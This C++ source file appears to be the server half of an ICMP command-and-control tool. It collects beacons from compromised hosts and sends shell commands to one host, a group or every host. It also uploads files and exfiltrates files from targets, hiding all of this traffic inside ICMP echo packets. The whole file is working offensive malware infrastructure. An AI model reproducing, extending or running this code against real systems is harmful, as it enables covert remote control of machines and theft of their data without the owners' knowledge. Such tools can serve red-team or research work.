/**
 * @file icmp_master.cpp
 * @author Jacob Doll (thedolleyllama)
 * 
 * ICMP C2
 * Listens for beacons from hosts and sends commands to 
 * them. Currently supports:
 * - sending commands and receiving output
 * - sending files to target machine
 * - receiving files from target machine
 */

#include <iostream>
#include <cstdint>
#include <cstring>
#include <cstdlib>
#include <stdio.h>
#include <string>
#include <thread>
#include <mutex>
#include <map>
#include <vector>
#include <sstream>
#include <fstream>
#include <algorithm>
#include <functional>

#include <unistd.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <sys/stat.h>
#include <netinet/in.h>
#include <netinet/ip_icmp.h>
#include <netinet/ip.h>
#include <arpa/inet.h>
#include <netdb.h>

struct command_t
{
  std::function<void(const std::string &)> call;
  std::string desc;
};

using host_mapping_t = std::map<std::string, std::string>;
using group_t = std::map<std::string, std::vector<std::string>>;

/** Expected host machines */
static host_mapping_t host_database;
/** Currently connected hosts */
static host_mapping_t active_connections;
static std::mutex active_connections_mutex;

/** Groups */
static group_t groups;

/** Currently selected host */
static std::string cur_host;

/** Currently selected group */
static std::string cur_group;

void cmd_help(const std::string &);
void cmd_list(const std::string &);
void cmd_hosts(const std::string &);
void cmd_group(const std::string &);
void cmd_set(const std::string &);
void cmd_run(const std::string &);
void cmd_file(const std::string &);
void cmd_exfil(const std::string &);
void cmd_runall(const std::string &);
void cmd_export(const std::string &);
void cmd_load(const std::string &);
void cmd_clear(const std::string &);
void cmd_exit(const std::string &);

static const std::map<std::string, command_t> commands = {
  { "help", { cmd_help, "help: displays usable commands" } },
  { "list", { cmd_list, "list: lists all active connections to the server" } },
  { "hosts", { cmd_hosts, "hosts: lists expected hosts that are supplied by the database file" } },
  { "group", { cmd_group,
               "group: by default this command lists all groups\n"
               "\tadd/rm [group] [host]: adds/removes a host to a group to run commands on\n"
               "\tlist [group]: lists all hosts within a group" } },
  { "set", { cmd_set, "set [host/group]: sets the current host to run commands on" } },
  { "run", { cmd_run, "run [command]: runs a command on the currently set host" } },
  { "file", { cmd_file,
              "file [src] [dst]: sends a file to the currently set host.\n"
              "\tsrc is the file on the server box, and dst is the location on the host machine." } },
  { "exfil", { cmd_exfil,
               "exfil [src] [dst]: exfiltrates a file from the currently set host.\n"
               "\tsrc is the location on the server to save the file, and dst is the location of the file on the host to exfiltrate." } },
  { "runall", { cmd_runall, "runall [command]: runs a command on all active connections" } },
  { "export", { cmd_export, "export [filename]: export all active connections to a database file" } },
  { "load", { cmd_load, "load [filename]: load a database file of host to ip mappings" } },
  { "clear", { cmd_clear, "clear: clear the active connections. Useful for testing if connections still exist." } },
  { "exit", { cmd_exit, "exit: stops the server and exits" } },
};

/**
 * @brief Calculates checksum of an array of data.
 * 
 * @param vdata pointer to array
 * @param size size of array
 * @return 2 byte checksum
 */
static uint16_t checksum(void *vdata, uint32_t size)
{
  uint8_t *data = (uint8_t *)vdata;

  // Initialise the accumulator.
  uint64_t acc = 0xffff;

  // Handle any partial block at the start of the data.
  unsigned int offset = ((uintptr_t)data) & 3;
  if (offset) {
    size_t count = 4 - offset;
    if (count > size)
      count = size;
    uint32_t word = 0;
    memcpy(offset + (char *)&word, data, count);
    acc += ntohl(word);
    data += count;
    size -= count;
  }

  // Handle any complete 32-bit blocks.
  uint8_t *data_end = data + (size & ~3);
  while (data != data_end) {
    uint32_t word;
    memcpy(&word, data, 4);
    acc += ntohl(word);
    data += 4;
  }
  size &= 3;

  // Handle any partial block at the end of the data.
  if (size) {
    uint32_t word = 0;
    memcpy(&word, data, size);
    acc += ntohl(word);
  }

  // Handle deferred carries.
  acc = (acc & 0xffffffff) + (acc >> 32);
  while (acc >> 16) {
    acc = (acc & 0xffff) + (acc >> 16);
  }

  // If the data began at an odd byte address
  // then reverse the byte order to compensate.
  if (offset & 1) {
    acc = ((acc & 0xff00) >> 8) | ((acc & 0x00ff) << 8);
  }

  // Return the checksum in network byte order.
  return ~acc;
}

/**
 * @brief Splits an string into an array using a space as the delimiter.
 * 
 * @param input string to split
 * @return vector of strings
 */
std::vector<std::string> split_input(const std::string &input)
{
  std::vector<std::string> ret;
  std::istringstream iss(input);
  for (std::string s; iss >> s;) {
    ret.push_back(s);
  }
  return ret;
}

/**
 * @brief Sends an ICMP echo reply to a specified ip.
 * 
 * Allows for user to specify the data field.
 * 
 * @param sockfd socket file descriptor to use
 * @param dst destination IPv4 string to use
 * @param buf buffer to fill data section with
 * @param size size of buffer to send
 */
long send_ping(int sockfd, const std::string &dst, uint8_t *buf, size_t size)
{
  uint8_t out[1024];// outgoing buffer used to send ping

  icmphdr *icmp = (icmphdr *)out;
  icmp->type = 0;// reply
  icmp->code = 0;
  icmp->checksum = 0;
  icmp->un.echo.sequence++;

  // copy buffer to data section
  if (buf && size > 0) {
    memcpy(&out[sizeof(icmphdr)], buf, size);
  }

  // calculate checksum and change byte order
  icmp->checksum = htons(checksum(out, sizeof(icmphdr) + size));

  // construct IP address from dst string
  sockaddr_in addr_;
  addr_.sin_family = AF_INET;
  addr_.sin_port = htons(0);
  addr_.sin_addr.s_addr = inet_addr(dst.c_str());

  // send data
  long ret;
  if ((ret = sendto(sockfd, out, sizeof(icmphdr) + size, 0, (sockaddr *)&addr_, sizeof(addr_))) == -1) {
    perror("sendto");
  }
  return ret;
}

/**
 * @brief Recieves an ICMP echo request and stores the IP.
 * 
 * Can read data entry into the specified buffer
 * 
 * @param sockfd socket file descriptor to use
 * @param src string to store source IPv4 in
 * @param buf buffer to fill with data section
 * @param size size of buffer to receive into
 */
long receive_ping(int sockfd, std::string &src, uint8_t *buf, size_t size)
{
  long ret = 0;
  uint8_t in[1024];
  if ((ret = read(sockfd, in, sizeof(in))) == -1) {
    return -1;
  }

  iphdr *ip = (iphdr *)in;
  if (ret > sizeof(iphdr)) {
    in_addr addr{ ip->saddr };
    char *src_ = inet_ntoa(addr);
    src = src_;

    if (ret > sizeof(iphdr) + sizeof(icmphdr)) {
      if (buf && size > 0) {
        memcpy(buf, in + sizeof(iphdr) + sizeof(icmphdr), ret - sizeof(iphdr) - sizeof(icmphdr));
      }
    }
  }

  return ret - sizeof(iphdr) - sizeof(icmphdr);
}

/**
 * @brief Listener thread for receiving beacons.
 * 
 * Listens for hosts to ping the server.
 */
void listen_task()
{
  // open a socket
  int sockfd = socket(PF_INET, SOCK_RAW, IPPROTO_ICMP);
  if (sockfd == -1) {
    perror("socket");
    std::exit(-1);
  }

  // create a buffer to store received data
  uint8_t in[1024];
  while (1) {
    // fill buffer with zeroes
    memset(in, 0, 1024);

    // receive a ping and store the ip addres
    std::string src_ip;
    ssize_t num_bytes = receive_ping(sockfd, src_ip, in, sizeof(in));

    if (num_bytes > 0) {
      char *hostname_ = (char *)in;
      std::string hostname = hostname_;

      // only store hostname into active connections list if a beacon is sent
      auto split = split_input(hostname);
      if (split.at(0).compare("(beacon)") == 0) {
        std::lock_guard<std::mutex> guard(active_connections_mutex);
        active_connections[split.at(1)] = src_ip;
      }
    }
  }
}

/**
 * @brief Sends a command to be executed on a designated ip address
 * 
 * @param dst ip address to send command
 * @param command string command to execute
 */
void send_command(const std::string &dst, const std::string &command)
{
  // open a socket
  int sockfd = socket(PF_INET, SOCK_RAW, IPPROTO_ICMP);
  if (sockfd == -1) {
    perror("socket");
    exit(-1);
  }

  // prepend command with run so the client knows what to do with this packet
  std::string cmd = "run ";
  cmd.append(command);

  // send the commmand to be executed
  send_ping(sockfd, dst, (uint8_t *)cmd.c_str(), cmd.size() + 1);

  // listen for response packets
  while (1) {
    uint8_t in[512];

    // receive a ping and store the ip addres
    std::string src_ip;
    ssize_t num_bytes = receive_ping(sockfd, src_ip, in, sizeof(in));

    if (dst != src_ip)
      continue;

    if (num_bytes > 0) {

      char *str_ = (char *)in;
      std::string str(str_, num_bytes);

      // only store hostname into active connections list if a beacon is sent
      auto split = split_input(str);
      if (split.at(0).compare("(beacon)") != 0) {
        // put command ouput to stdout
        std::fputs(str.c_str(), stdout);
      }
    } else {
      break;
    }
  }
}

/**
 * @brief Sends a file to be copied to a designated file location on the host
 * 
 * @param dst ip address to send file
 * @param src_file filename of file to copy
 * @param dst_file filename of file to put on host
 */
void send_file(const std::string &dst, const std::string &src_file, const std::string &dst_file)
{
  // open a socket
  int sockfd = socket(PF_INET, SOCK_RAW, IPPROTO_ICMP);
  if (sockfd == -1) {
    perror("socket");
    exit(-1);
  }

  // prepend command with file so the client knows what to do with this packet
  std::string cmd = "file ";
  cmd.append(dst_file);

  // send packet to host
  send_ping(sockfd, dst, (uint8_t *)cmd.c_str(), cmd.size() + 1);

  // open file on machine to read
  FILE *fp = fopen(src_file.c_str(), "rb");
  uint8_t out[512];
  if (fp == NULL) {
    perror("fopen");
    send_ping(sockfd, dst, NULL, 0);
    return;
  }

  size_t nbytes;
  do {
    // send file 512 bytes at a time to the host
    nbytes = fread(out, 1, sizeof(out), fp);
    send_ping(sockfd, dst, out, nbytes);
  } while (nbytes != 0);

  send_ping(sockfd, dst, NULL, 0);
}

/**
 * @brief Receives a file from a host machine to be saved at a designated location
 * 
 * @param dst ip address to receive file from
 * @param src_file filename of file to copy into
 * @param dst_file filename of file to receive from on host
 */
void receive_file(const std::string &dst, const std::string &src_file, const std::string &dst_file)
{
  // open a socket
  int sockfd = socket(PF_INET, SOCK_RAW, IPPROTO_ICMP);
  if (sockfd == -1) {
    perror("socket");
    exit(-1);
  }

  // prepend command with exfil so the client knows what to do with this packet
  std::string cmd = "exfil ";
  cmd.append(src_file);

  // send packet to host
  send_ping(sockfd, dst, (uint8_t *)cmd.c_str(), cmd.size() + 1);

  // open file to be written to
  FILE *fp = fopen(dst_file.c_str(), "wb+");
  if (fp == NULL) {
    perror("fopen");
    return;
  }

  while (1) {
    uint8_t in[512];
    // receive file 512 bytes at a time and write to file
    std::string src_ip;
    ssize_t num_bytes = receive_ping(sockfd, src_ip, in, sizeof(in));

    if (dst != src_ip)
      continue;

    if (num_bytes > 0) {
      char *str_ = (char *)in;
      std::string str(str_, num_bytes);

      // only store hostname into active connections list if a beacon is sent
      auto split = split_input(str);
      if (split.at(0).compare("(beacon)") != 0) {
        // put command ouput to stdout
        fwrite(in, 1, num_bytes, fp);
      }
    } else {
      fclose(fp);
      break;
    }
  }
}

/**
 * @brief ping an ip
 * 
 * @param dst ip to send ping to
 */
void ping(const std::string &dst)
{
  int sockfd = socket(PF_INET, SOCK_RAW, IPPROTO_ICMP);
  if (sockfd == -1) {
    perror("socket");
    exit(-1);
  }
  send_ping(sockfd, dst, NULL, 0);
}

/**
 * @brief save currently connected hosts to file
 * 
 * This allows for me to load hosts manually and save state.
 * 
 * @param filename filename of file to save to
 */
void export_connections(const std::string &filename)
{
  std::ofstream file(filename);
  if (file.is_open()) {
    std::lock_guard<std::mutex> guard(active_connections_mutex);
    auto it = active_connections.begin();
    for (; it != active_connections.end(); it++) {
      file << it->first << " " << it->second << "\n";
    }
    file.close();
  }
}

/**
 * @brief Load hosts from file
 * 
 * This allows for me to load hosts manually and save state.
 * 
 * @param filename filename of file to load from
 */
void load_connections(const std::string &filename)
{
  std::ifstream file(filename);
  if (file.is_open()) {
    std::string host, ip;
    while (file >> host >> ip) {
      host_database[host] = ip;
    }
    file.close();
  }
}

std::ostream &operator<<(std::ostream &os, const host_mapping_t &mapping)
{
  auto it = mapping.begin();
  for (; it != mapping.end(); it++) {
    os << it->first << ": " << it->second << "\n";
  }
  return os;
}

/**
 * @brief Print help message.
 */
void cmd_help(const std::string &input)
{
  auto it = commands.begin();
  for (; it != commands.end(); it++) {
    std::puts(it->second.desc.c_str());
  }
}

void cmd_list(const std::string &)
{
  std::puts("Listing active machines!");
  std::lock_guard<std::mutex> guard(active_connections_mutex);
  std::cout << active_connections;
}

void cmd_hosts(const std::string &)
{
  std::puts("Listing host machines!");
  std::cout << host_database;
}

void cmd_group(const std::string &input)
{
  auto input_arr = split_input(input);

  if (input_arr.size() < 2) {
    auto it = groups.begin();
    for (; it != groups.end(); it++) {
      std::puts(it->first.c_str());
    }
    return;
  }
  auto &sub_cmd = input_arr.at(1);
  if (sub_cmd == "add") {
    if (input_arr.size() < 4) {
      std::puts("usage: add [group] [host]");
      return;
    }
    auto &group_name = input_arr.at(2);
    auto &host_name = input_arr.at(3);
    if (groups.find(group_name) == groups.end()) {
      groups[group_name] = std::vector<std::string>{ host_name };
    } else {
      groups.at(group_name).emplace_back(host_name);
    }
    return;
  }
  if (sub_cmd == "rm") {
    if (input_arr.size() < 4) {
      std::puts("usage: rm [group] [host]");
      return;
    }
    auto &group_name = input_arr.at(2);
    auto &host_name = input_arr.at(3);
    if (groups.find(group_name) == groups.end()) {
      std::puts("group not found");
    } else {
      auto &group = groups.at(group_name);
      auto itr = std::find(group.begin(), group.end(), host_name);
      if (itr != group.end()) group.erase(itr);
    }
    return;
  }
  if (sub_cmd == "list") {
    if (input_arr.size() < 3) {
      std::puts("usage: list [group]");
      return;
    }
    auto &group_name = input_arr.at(2);
    if (groups.find(group_name) == groups.end()) {
      std::puts("group not found");
    } else {
      auto group = groups.at(group_name);
      for (auto host : group) {
        std::puts(host.c_str());
      }
    }
    return;
  }
}

void cmd_set(const std::string &input)
{
  auto input_arr = split_input(input);

  if (input_arr.size() < 2) {
    std::puts("usage: set [host]");
    return;
  }
  if (active_connections.find(input_arr.at(1)) != active_connections.end()) {
    cur_host = input_arr.at(1);
    cur_group.clear();
  } else if (groups.find(input_arr.at(1)) != groups.end()) {
    cur_group = input_arr.at(1);
    cur_host.clear();
  } else {
    std::puts("group nor active connection exists!");
  }
}

void cmd_run(const std::string &input)
{
  auto input_arr = split_input(input);

  if (input_arr.size() < 2) {
    std::puts("usage: run [command]");
    return;
  }

  std::string command;
  for (int i = 1; i < input_arr.size(); i++) {
    command.append(input_arr.at(i));
    if (i != input_arr.size() - 1) {
      command.append(" ");
    }
  }

  if (!cur_host.empty()) {
    std::string ip = active_connections[cur_host];
    std::cout << "Running command \"" << command << "\" on "
              << ip
              << "\n";
    send_command(ip, command);
  } else if (!cur_group.empty()) {
    auto &group = groups.at(cur_group);
    for (auto &host : group) {
      if (active_connections.find(host) == active_connections.end()) {
        continue;
      }
      std::string ip = active_connections[host];
      std::cout << "Running command \"" << command << "\" on "
                << ip
                << "\n";
      send_command(ip, command);
    }
  } else {
    std::puts("no group or host selected!");
  }
}

void cmd_file(const std::string &input)
{
  auto input_arr = split_input(input);

  if (input_arr.size() < 3) {
    std::puts("usage: file [src] [dst]");
    return;
  }
  std::string ip = active_connections[cur_host];

  std::cout << "Sending file: " << input_arr.at(1) << " to: " << input_arr.at(2) << " on: "
            << ip
            << "\n";
  send_file(ip, input_arr.at(1), input_arr.at(2));
}

void cmd_exfil(const std::string &input)
{
  auto input_arr = split_input(input);

  if (input_arr.size() < 3) {
    std::puts("usage: exfil [src] [dst]");
    return;
  }
  std::string ip = active_connections[cur_host];

  std::cout << "Receiving file: " << input_arr.at(1) << " to: " << input_arr.at(2) << " on: "
            << ip
            << "\n";
  receive_file(ip, input_arr.at(1), input_arr.at(2));
}

void cmd_runall(const std::string &input)
{
  auto input_arr = split_input(input);

  if (input_arr.size() < 2) {
    std::puts("usage: runall [command]");
    return;
  }

  std::string command;
  for (int i = 1; i < input_arr.size(); i++) {
    command.append(input_arr.at(i));
    if (i != input_arr.size() - 1) {
      command.append(" ");
    }
  }

  std::lock_guard<std::mutex> guard(active_connections_mutex);
  auto it = active_connections.begin();
  for (; it != active_connections.end(); it++) {
    std::cout << "Running command \"" << command << "\" on "
              << it->second
              << "\n";
    send_command(it->second, command);
  }
}

void cmd_export(const std::string &input)
{
  auto input_arr = split_input(input);

  std::string filename;
  if (input_arr.size() > 1) {
    filename = input_arr.at(1);
  } else {
    // default filename
    filename = "exported.txt";
  }
  std::cout << "Exporting to: " << filename << "\n";
  export_connections(filename);
}

void cmd_load(const std::string &input)
{
  auto input_arr = split_input(input);

  if (input_arr.size() < 2) {
    std::puts("usage: load [filename]");
    return;
  }
  std::cout << "Loading from: " << input_arr.at(1) << "\n";
  load_connections(input_arr.at(1));
}

void cmd_clear(const std::string &)
{
  std::puts("Clearing active connections");
  std::lock_guard<std::mutex> guard(active_connections_mutex);
  active_connections.clear();
}

void cmd_exit(const std::string &)
{
  exit(0);
}

/**
 * @brief Main entry point.
 * 
 * Starts command prompt to allow user to interact with hosts.
 * 
 * @param argc number of args
 * @param argv arguments
 * @return 0 on success, -1 on failure
 */
int main(int argc, char **argv)
{
  // load hosts from file
  if (argc > 1) {
    load_connections(argv[1]);
  }

  // display help message
  cmd_help("help");

  std::puts("Starting listening thread.");
  std::thread listen_thread(listen_task);
  listen_thread.detach();

  // begin command loop
  while (1) {
    std::string input;
    std::cout << (cur_host.empty() ? cur_group : cur_host) << " > ";
    std::getline(std::cin, input);

    if (input.empty()) {
      continue;
    }

    // split input by spaces and save into an vector
    auto input_arr = split_input(input);

    if (commands.find(input_arr.at(0)) != commands.end()) {
      commands.at(input_arr.at(0)).call(input);
    }
  }

  return 0;
}
